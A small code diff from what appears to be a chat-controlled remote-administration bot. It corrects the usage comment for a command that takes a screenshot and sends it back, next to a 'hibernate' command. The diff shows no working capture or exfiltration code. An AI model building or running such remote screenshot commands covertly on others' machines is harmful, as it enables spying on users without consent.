@@ -123,7 +123,7 @@ async def hibernate(seconds = 0):
 
 # Module: screenshot
 # Description: Takes a screenshot and sends it back
-# Usage: !screenshot or !lock secondsToScreenshot
+# Usage: !screenshot or !screenshot secondsToScreenshot
 # Dependencies: time, os, mss
 @client.command()
 async def screenshot(seconds = 0):
